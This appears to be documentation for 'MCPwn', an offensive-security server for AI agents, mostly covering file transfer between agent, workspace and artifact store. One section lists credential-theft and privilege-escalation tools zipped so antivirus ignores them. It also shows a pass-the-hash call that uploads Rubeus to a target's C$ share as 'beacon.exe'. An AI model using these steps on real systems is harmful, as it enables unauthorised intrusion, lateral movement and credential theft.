# MCPwn Files & Artifacts

Two storage planes plus a target-transfer layer. Pick by size, mutability, and destination.

## Planes

- **Session workspace** — mutable per-session dir (`workspace` from `create_analysis_session`). Tools that write/patch/run (GDB, pwntools, patchelf, unpackers) operate here.
- **CAS artifacts** — immutable content-addressed blobs on the `:5001` data plane (`/data/artifacts`). Used for large uploads, large tool output, and cross-agent handoff. Referenced as `mcp://artifacts/<sha256>`.

## Into the server

Decide by **source/type, not size** — byte count is a red herring:

| Case | Mechanism |
|------|-----------|
| Text you author in-context (script, exploit, config) | `write_workspace_file(session_id, filename, content_text=...)` — one call, already in context, no corruption risk; auto-creates parent dirs (`www/app/h.js` needs no mkdir). |
| A file that already exists on disk (any size, binary or text) | `request_upload` → HTTP PUT raw bytes to the `:5001` URL → `import_artifact_to_workspace` (skip import if you only need the CAS ref). Flow below. |
| A small binary blob generated in-context, not on disk | `write_workspace_file(..., content_base64=..., sha256=<digest>)` — last resort. |

**Never `base64 -w0` a disk file into `content_base64`.** It streams the bytes through the model context (token cost ∝ file size) and one flipped char is still valid base64 — it decodes to *different bytes with no error*, so downstream PKI/binary consumers (OpenSSL, OpenVPN, signed archives, ELF loaders) reject the result while the transfer looks clean. The `:5001` PUT has **no minimum size**, keeps bytes out of context, and is content-addressed by SHA (corruption impossible on a 201) — make it the default for on-disk files at any size. When you must use `content_base64`, pass `sha256=<source digest>`: the server verifies the decoded bytes, **refuses to write on mismatch**, and always echoes the written `sha256`.

### Large-file upload — the working flow (agent-driven)

The MCP tool surface has no "send bytes" call; the upload is a plain HTTP PUT to the `:5001` data plane. When the agent has a **local shell / HTTP tool that can reach `:5001`** (the usual case — loopback ticket URLs use `http://127.0.0.1:5001/...`), the agent does the PUT itself; no human needed.

1. Compute sha256 + size **client-side** — the file is not on the server yet (`sha256sum f` / `stat -c %s f`).
2. `request_upload(filename, file_size_bytes, checksum_sha256, session_id)` → `upload_url`, `artifact_id`. Cache hit (server already has that SHA) → `upload_required:false`; skip to step 4.
3. PUT the raw bytes from your local shell, **discarding the body** — the JSON response echoes a huge `preview_base64` that floods context:
   `curl -s -X PUT --data-binary @f "<upload_url>" -o /dev/null -w "%{http_code}\n"` → expect `201`.
4. `import_artifact_to_workspace(session_id, artifact_id, executable=True)` to land it in the mutable workspace (required by GDB/pwntools/patchelf/run tools).

Gotchas (each cost real turns):
- **Sequence, don't parallelize:** call `import_artifact_to_workspace` only *after* the PUT returns 201 — importing before the bytes land returns 404 (`artifact not found`).
- **Never base64-chunk a large file** through `write_workspace_file`/`execute_command`: every chunk's bytes traverse the agent's context, so a few-MB file costs megabytes of tokens (and gets truncated). Use this PUT flow instead — the bytes never enter context.
- **Only** when the client truly can't reach `:5001` (remote server, no port forward) does a human/other client perform the PUT; that is the sole case the agent can't.

## Reading / patching workspace files

- `read_workspace_file` — line mode (`offset`/`limit`) or byte mode (`from_byte` for tailing growing logs). Binary returns base64.
- `patch_workspace_file` — atomic exact-text edits; `old_text` must match once.
- Prefer these over `cat`/`sed` via `execute_command`: no shell overhead, no output-size cap, atomic.

## Out of the server

- `list_artifacts(session_id)` — scope to the session (omitting it returns up to 200 across all sessions).
- `analyze_artifact(artifact_id)` — size/mime/preview without transferring the blob. Check before downloading.
- `request_download(artifact_id)` — tokenized single-use GET URL on `:5001`. GET it from your local shell the same way you PUT: `curl -s "<download_url>" -o out.bin` (only a human/other client is needed when the agent can't reach `:5001`).

## CAS ↔ workspace

- **Read-only analyzers** (`checksec_binary`, `find_rop_gadgets`, `analyze_with_radare2`, `decompile_with_radare2`, `extract_strings`, `pe_inspect`, `readelf_inspect`, `seccomp_analyze`) accept a CAS ref directly via `binary_path` — no import needed.
- **Workspace-only tools** (`auto_detect_vulnerabilities`, `gdb_*`, `trace_*`, `patchelf_patch`, `upx_unpack`, `run_pwntools_exploit`) require `import_artifact_to_workspace(session_id, artifact_id, executable=True)` first.

## Pre-staged payload depots (`/opt/`)

Both images ship transfer-to-target depots so you don't scramble to fetch tooling:
- `/opt/windows-payloads/` — Windows PE/.NET as ZipCrypto zips (password `mcpwn`, so on-disk AV ignores them): mimikatz, Rubeus, Certify, SharpUp, Seatbelt, JuicyPotatoNG, PrintSpoofer, GodPotato, winPEAS, Snaffler, PowerView/PowerUp, LaZagne, PsExec, procdump, RunasCs, nc64, chisel.exe. Unzip on target: `7z x file.zip -pmcpwn`.
- `/opt/linux-payloads/` — linpeas, LinEnum, lse, linux-exploit-suggester, deepce, pspy, traitor, chisel — extracted, ready to serve.

Handoff helpers (one call instead of extract-then-upload):
- `list_payloads({kind})` — enumerate the depots.
- `get_payload({name, kind})` — resolve a friendly name (case/ext-insensitive: `Rubeus`→`Rubeus.exe`, `linpeas`→`linpeas.sh`), extracting the Windows zip on demand (cached in `/tmp/payloads/`).
- `upload_to_target({payload, target, backend, ...})` — ship a depot payload (or absolute path) via `smb`/`scp`/`ftp`/`http` PUT. SMB accepts `auth_hash` (`LM:NT` or bare `NT`) → pass-the-hash in one call.

```python
run_tool("upload_to_target", {
  "payload": "Rubeus", "target": "10.10.10.5", "backend": "smb", "share": "C$",
  "auth_user": "Administrator", "auth_domain": "CORP",
  "auth_hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
  "remote_path": "Windows/Temp/beacon.exe",
})
```

## Sub-agent handoff (critical)

A sub-agent spawned **without** working MCP tools does not inherit the MCPwn client — hand off state as a CAS artifact (`mcp://artifacts/<sha>`), which it fetches via the `:5001` HTTP data plane; never expect it to reach the MCP server directly.

A sub-agent spawned **with** working MCP tools (e.g. `delegate(..., mcp=True)`) *can* drive MCPwn: pass it the `session_id`, and it operates the **same server-side workspace** (files persist across the session) via `execute_command`/`read_workspace_file`/etc. — no re-upload needed. Sessions are shared server state keyed by `session_id`, so the child sees whatever you staged and vice-versa.
